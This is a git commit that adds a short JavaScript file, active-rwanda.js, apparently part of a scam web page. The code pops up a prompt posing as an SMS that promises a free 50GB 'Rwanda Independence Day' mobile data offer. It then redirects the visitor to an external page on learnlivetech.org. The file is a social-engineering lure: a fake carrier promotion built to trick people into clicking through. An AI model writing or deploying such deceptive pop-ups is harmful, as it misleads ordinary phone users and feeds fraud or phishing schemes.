7db64cfd8be6024a9c5616a00d125625e75dbbd5
bigukpe <bigaka42@gmail.com>
2025-06-30 08:47:54 +0100

    Create active-rwanda.js

---
+++ active-rwanda.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations, your Mobile number is eligible to receive 50gb Rwanda Independence Day celebration offer, Press Ok to activate Now ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://learnlivetech.org/rwanda-50gb.html';
+}
